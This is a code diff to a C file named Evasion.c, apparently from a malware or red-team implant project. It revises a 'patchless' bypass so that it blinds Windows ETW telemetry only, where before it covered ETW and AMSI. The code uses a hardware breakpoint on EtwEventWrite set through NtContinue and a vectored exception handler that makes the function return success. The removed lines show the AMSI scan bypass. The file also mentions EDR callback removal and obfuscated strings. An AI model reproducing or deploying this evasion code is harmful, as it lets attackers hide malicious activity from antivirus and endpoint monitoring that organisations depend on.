@@ -1,5 +1,5 @@
 // =============================================
-// Evasion.c - Patchless AMSI/ETW Bypass
+// Evasion.c - Patchless ETW Bypass
 //             (VEH + Hardware Breakpoints + NtContinue)
 //             DLL Notification Callback Removal (EDR Blinding)
 //             Anti-Analysis
@@ -27,8 +27,7 @@ static VOID NTAPI DummyDllNotifCallback(ULONG Reason, PVOID Data, PVOID Ctx) {
 }
 
 // Global target addresses for VEH handler
-static PVOID g_pEtwEventWrite   = NULL;
-static PVOID g_pAmsiScanBuffer  = NULL;
+static PVOID g_pEtwEventWrite = NULL;
 
 // VEH handle for cleanup
 static PVOID g_hVeh = NULL;
@@ -42,7 +41,7 @@ static volatile BOOL g_bHwBpSet = FALSE;
 // and makes the target function "return" immediately
 // without writing any bytes to code memory.
 //
-// EDR integrity checks see unmodified ntdll/amsi code.
+// EDR integrity checks see unmodified ntdll code.
 // -----------------------------------------------
 static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {
 
@@ -59,35 +58,26 @@ static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {
         return EXCEPTION_CONTINUE_EXECUTION;
     }
 
-    // AmsiScanBuffer hit -> return E_INVALIDARG
-    // Callers that check HRESULT will skip the scan result entirely
-    if (g_pAmsiScanBuffer && ctx->Rip == (ULONG_PTR)g_pAmsiScanBuffer) {
-        ctx->Rax = 0x80070057;  // E_INVALIDARG
-        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
-        ctx->Rsp += sizeof(ULONG_PTR);
-        return EXCEPTION_CONTINUE_EXECUTION;
-    }
-
     return EXCEPTION_CONTINUE_SEARCH;
 }
 
 // -----------------------------------------------
-// Patchless AMSI/ETW Bypass
+// Patchless ETW Bypass
 //
-// Sets hardware breakpoints (DR0/DR1) on EtwEventWrite
-// and AmsiScanBuffer using RtlCaptureContext + NtContinue.
+// Sets a hardware breakpoint (DR0) on EtwEventWrite
+// via RtlCaptureContext + NtContinue.
 //
-// NtContinue sets debug registers without ETW-TI
+// NtContinue sets the debug register without ETW-TI
 // telemetry (unlike NtSetContextThread which is logged).
 //
-// VEH handler intercepts the breakpoint exceptions and
-// makes the functions "return" with benign values.
+// VEH handler intercepts the breakpoint exception and
+// makes EtwEventWrite "return" STATUS_SUCCESS (0).
 //
 // Zero bytes of code are modified — fully patchless.
 // -----------------------------------------------
-BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {
+BOOL PatchlessEtw(IN PAPI_HASHING pApi) {
 
-    // --- Resolve target function addresses ---
+    // --- Resolve EtwEventWrite in ntdll ---
 
     BYTE xNtdll[] = XSTR_NTDLL_DLL;
     DEOBF(xNtdll);
@@ -99,18 +89,6 @@ BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {
     DEOBF(xEtw);
     g_pEtwEventWrite = (PVOID)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xEtw);
     if (!g_pEtwEventWrite)
-        return FALSE;
-
-    BYTE xAmsiDll[] = XSTR_AMSI_DLL;
-    DEOBF(xAmsiDll);
-    HMODULE hAmsi = pApi->pLoadLibraryA((LPCSTR)xAmsiDll);
-    if (!hAmsi)
-        return FALSE;
-
-    BYTE xAmsiFunc[] = XSTR_AMSI_SCAN_BUFFER;
-    DEOBF(xAmsiFunc);
-    g_pAmsiScanBuffer = (PVOID)pApi->pGetProcAddress(hAmsi, (LPCSTR)xAmsiFunc);
-    if (!g_pAmsiScanBuffer)
         return FALSE;
 
     // --- Resolve VEH / Context APIs from ntdll ---
@@ -142,11 +120,11 @@ BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {
     if (!g_hVeh)
         return FALSE;
 
-    LOG("[+] Patchless: VEH registered");
+    LOG("[+] Patchless ETW: VEH registered");
 
-    // --- Set hardware breakpoints via RtlCaptureContext + NtContinue ---
+    // --- Set hardware breakpoint via RtlCaptureContext + NtContinue ---
     // RtlCaptureContext captures the current thread context (including RIP).
-    // We modify DR0/DR1/DR7 in the captured context and call NtContinue,
+    // We modify DR0/DR7 in the captured context and call NtContinue,
     // which restores the context with our debug register values and
     // resumes execution at the instruction after RtlCaptureContext.
     //
@@ -161,16 +139,15 @@ BOOL PatchlessAmsiEtw(IN PAPI_HASHING pApi) {
     if (!g_bHwBpSet) {
         g_bHwBpSet = TRUE;
 
-        ctx.Dr0 = (ULONG_PTR)g_pEtwEventWrite;     // DR0 = EtwEventWrite
-        ctx.Dr1 = (ULONG_PTR)g_pAmsiScanBuffer;    // DR1 = AmsiScanBuffer
-        ctx.Dr7 = (1 << 0) | (1 << 2);             // L0 + L1: local enable, execute-on-1-byte
+        ctx.Dr0 = (ULONG_PTR)g_pEtwEventWrite;  // DR0 = EtwEventWrite
+        ctx.Dr7 = (1 << 0);                      // L0: local enable, execute-on-1-byte
 
         ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
         pNtContinue(&ctx, FALSE);
         // Unreachable — NtContinue resumes at pRtlCaptureCtx's return point
     }
 
-    LOG("[+] Patchless: HW breakpoints set (DR0=ETW, DR1=AMSI)");
+    LOG("[+] Patchless ETW: HW breakpoint set (DR0=ETW)");
     return TRUE;
 }
 
@@ -230,10 +207,9 @@ VOID CleanupEvasion(IN PAPI_HASHING pApi) {
     }
 
     // Clear all evasion state
-    g_hVeh             = NULL;
-    g_pEtwEventWrite   = NULL;
-    g_pAmsiScanBuffer  = NULL;
-    g_bHwBpSet         = FALSE;
+    g_hVeh           = NULL;
+    g_pEtwEventWrite = NULL;
+    g_bHwBpSet       = FALSE;
 
     LOG("[+] Evasion cleanup: VEH removed, debug registers cleared");
 }
